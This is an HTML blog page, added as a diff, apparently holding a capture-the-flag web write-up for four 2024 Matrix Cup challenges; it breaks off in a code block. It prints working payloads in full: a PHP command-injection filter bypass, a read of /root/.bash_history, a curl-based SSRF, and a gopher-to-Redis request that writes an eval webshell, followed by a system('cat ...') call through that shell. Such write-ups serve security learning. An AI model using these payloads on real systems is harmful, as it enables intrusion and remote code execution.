@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>2024-矩阵杯WebWriteUp - N1Rvana&#39;s Blog</title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="Web Security" /><meta name="keywords" content='矩阵杯WriteUp' /><meta itemprop="name" content="2024-矩阵杯WebWriteUp">
+<meta itemprop="description" content=""><meta itemprop="datePublished" content="2024-06-05T19:03:02+08:00" />
+<meta itemprop="dateModified" content="2024-06-05T19:03:02+08:00" />
+<meta itemprop="wordCount" content="1246"><meta itemprop="image" content="https://nlrvana.github.io/avatar.png" />
+<meta itemprop="keywords" content="矩阵杯WriteUp," /><meta property="og:title" content="2024-矩阵杯WebWriteUp" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nlrvana.github.io/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/" /><meta property="og:image" content="https://nlrvana.github.io/avatar.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-06-05T19:03:02+08:00" />
+<meta property="article:modified_time" content="2024-06-05T19:03:02+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://nlrvana.github.io/avatar.png" /><meta name="twitter:title" content="2024-矩阵杯WebWriteUp"/>
+<meta name="twitter:description" content=""/>
+<meta name="twitter:site" content="@huahua39079406"/>
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://nlrvana.github.io/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup/" /><link rel="prev" href="https://nlrvana.github.io/%E7%AC%AC%E4%B8%83%E7%AB%A0-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90--%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "2024-矩阵杯WebWriteUp",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/nlrvana.github.io\/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup\/"
+    },"genre": "posts","keywords": "矩阵杯WriteUp","wordcount":  1246 ,
+    "url": "https:\/\/nlrvana.github.io\/2024-%E7%9F%A9%E9%98%B5%E6%9D%AFwriteup\/","datePublished": "2024-06-05T19:03:02+08:00","dateModified": "2024-06-05T19:03:02+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "N1Rvana"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item has-children">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/categories/"
+                          
+                          
+                        ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/tags/"
+                          
+                          
+                        ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/friends/"
+                
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="关键词搜索" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="N1Rvana&#39;s Blog"><span class="header-title-text">N1Rvana&#39;s Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="关键词搜索" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li
+              class="menu-item"
+            ><span class="nested-item">
+                  <a
+                    class="menu-link"
+                    href="/posts/"
+                    
+                    
+                  ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 技术</a>
+                  <i class="dropdown-icon fa-solid fa-chevron-right" aria-hidden="true"></i>
+                </span>
+                <ul class="sub-menu">
+                  <li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/categories/"
+                          
+                          
+                        ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a>
+                      </li><li
+                        class="menu-item"
+                      >
+                        <a
+                          class="menu-link"
+                          href="/tags/"
+                          
+                          
+                        ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a>
+                      </li></ul></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/friends/"
+                  
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="N1Rvana&#39;s Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">2024-矩阵杯WebWriteUp</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><span>2024-矩阵杯WebWriteUp</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/avatar.png" data-title="N1Rvana" data-alt="N1Rvana" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;N1Rvana</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/ctf/" class="post-category" title="Category - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="post-meta-line"><span title="published on 2024-06-05 19:03:02"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-06-05">2024-06-05</time></span>&nbsp;<span title="1246 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>6 minutes</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="2024-矩阵杯WebWriteUp">
+            <i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;views
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#easyweb">easyweb</a></li>
+    <li><a href="#where">where</a></li>
+    <li><a href="#tantantan">tantantan</a></li>
+    <li><a href="#what_can_i_say">WHAT_CAN_I_SAY</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="easyweb" class="heading-element">
+  <a href="#easyweb" class="heading-mark"></a>easyweb</h2><p>访问<code>/flag.php</code>，发现源码<code>加密的代码.zip</code><br>
+下载下来，进行绕过</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">      	<span class="o">&lt;?</span><span class="nx">php</span>  
+</span></span><span class="line"><span class="cl">      	<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">floatval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])</span> <span class="o">!==</span> <span class="s1">&#39;1&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>   
+</span></span><span class="line"><span class="cl">      	<span class="p">{</span>  
+</span></span><span class="line"><span class="cl">      		<span class="k">echo</span> <span class="s1">&#39;welcome,admin&#39;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">      		<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">True</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">      	<span class="p">}</span>   
+</span></span><span class="line"><span class="cl">      	<span class="k">else</span>   
+</span></span><span class="line"><span class="cl">      	<span class="p">{</span>  
+</span></span><span class="line"><span class="cl">	        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;flag?&#39;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">      	<span class="p">}</span>  
+</span></span><span class="line"><span class="cl">      	<span class="cp">?&gt;</span><span class="err">  
+</span></span></span><span class="line"><span class="cl"><span class="err">  
+</span></span></span><span class="line"><span class="cl"><span class="err">      	&lt;?php  
+</span></span></span><span class="line"><span class="cl"><span class="err">	     if ($_SESSION[&#39;admin&#39;])   
+</span></span></span><span class="line"><span class="cl"><span class="err">	     {  
+</span></span></span><span class="line"><span class="cl"><span class="err">	       if(isset($_POST[&#39;code&#39;]))  
+</span></span></span><span class="line"><span class="cl"><span class="err">	       {  
+</span></span></span><span class="line"><span class="cl"><span class="err">		       if(preg_match(&#34;/(ls|c|a|t| |f|i|n|d&#39;)/&#34;, $_POST[&#39;code&#39;])==1)  
+</span></span></span><span class="line"><span class="cl"><span class="err">			       echo &#39;no!&#39;;  
+</span></span></span><span class="line"><span class="cl"><span class="err">		       elseif(preg_match(&#34;/[@#%^&amp;*()|\/?&gt;&lt;&#39;]/&#34;,$_POST[&#39;code&#39;])==1)  
+</span></span></span><span class="line"><span class="cl"><span class="err">			       echo &#39;no!&#39;;  
+</span></span></span><span class="line"><span class="cl"><span class="err">			else  
+</span></span></span><span class="line"><span class="cl"><span class="err">				system($_POST[&#39;code&#39;]);  
+</span></span></span><span class="line"><span class="cl"><span class="err">	       }  
+</span></span></span><span class="line"><span class="cl"><span class="err">	     }  
+</span></span></span><span class="line"><span class="cl"><span class="err">	     ?&gt;  
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">POST /index.php?id=0.999999999999999999 HTTP/1.1  
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: web-fe24daddc0.challenge.xctf.org.cn  
+</span></span></span><span class="line"><span class="cl"><span class="err">Upgrade-Insecure-Requests: 1  
+</span></span></span><span class="line"><span class="cl"><span class="err">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36  
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Encoding: gzip, deflate, br  
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Language: zh-CN,zh;q=0.9  
+</span></span></span><span class="line"><span class="cl"><span class="err">Connection: close  
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Type: application/x-www-form-urlencoded  
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Length: 12  
+</span></span></span><span class="line"><span class="cl"><span class="err">  
+</span></span></span><span class="line"><span class="cl"><span class="err">code=l&#34;&#34;s%0a  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011038609.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011038609.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011038609.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011038609.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011038609.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011038609.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>
+访问<code>/7l8g</code>得到<code>flag</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011039889.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011039889.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011039889.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011039889.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011039889.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011039889.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="where" class="heading-element">
+  <a href="#where" class="heading-mark"></a>where</h2><p><code>/look?file=</code>存在任意文件读取，读取<code>/root/.bash_history</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011040218.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011040218.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011040218.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011040218.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011040218.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011040218.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="tantantan" class="heading-element">
+  <a href="#tantantan" class="heading-mark"></a>tantantan</h2><p>访问<code>/aaabbb.php</code><br>
+<code>POST data=file:///var/www/html/aaabbb.php</code> 读取源码</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">// error_reporting(E_ALL &amp; ~E_WARNING);  
+</span></span></span><span class="line"><span class="cl"><span class="c1">// highlight_file(__FILE__);  
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$url</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$ch</span><span class="o">=</span><span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="p">(</span><span class="nv">$result</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">  
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>dict://127.0.0.1:6379</code>发现存在<code>redis</code>服务<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011100756.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011100756.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011100756.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011100756.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011100756.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011100756.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>
+利用<code>gopher</code>打<code>redis</code></p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">POST /aaabbb.php HTTP/1.1  
+</span></span></span><span class="line"><span class="cl"><span class="err">Host: web-da58846781.challenge.xctf.org.cn  
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Length: 26  
+</span></span></span><span class="line"><span class="cl"><span class="err">Cache-Control: max-age=0  
+</span></span></span><span class="line"><span class="cl"><span class="err">Upgrade-Insecure-Requests: 1  
+</span></span></span><span class="line"><span class="cl"><span class="err">Origin: http://web-da58846781.challenge.xctf.org.cn  
+</span></span></span><span class="line"><span class="cl"><span class="err">Content-Type: application/x-www-form-urlencoded  
+</span></span></span><span class="line"><span class="cl"><span class="err">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36  
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
+</span></span></span><span class="line"><span class="cl"><span class="err">Referer: http://web-da58846781.challenge.xctf.org.cn//aaabbb.php  
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Encoding: gzip, deflate, br  
+</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Language: zh-CN,zh;q=0.9  
+</span></span></span><span class="line"><span class="cl"><span class="err">Connection: close  
+</span></span></span><span class="line"><span class="cl"><span class="err">  
+</span></span></span><span class="line"><span class="cl"><span class="err">data=gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_REQUEST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A  </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>生成<code>shell.php</code><br>
+访问<code>/shell.php?1=system('cat /9jsh267sbh1312h7dn2');</code><br>
+获得<code>flag</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011105893.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011105893.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011105893.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011105893.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011105893.png" data-alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202406011105893.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="what_can_i_say" class="heading-element">
+  <a href="#what_can_i_say" class="heading-mark"></a>WHAT_CAN_I_SAY</h2><p>有一些过滤，先把它注释掉，然后进行绕过</p>
+<div class="highlight" id="id-5"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
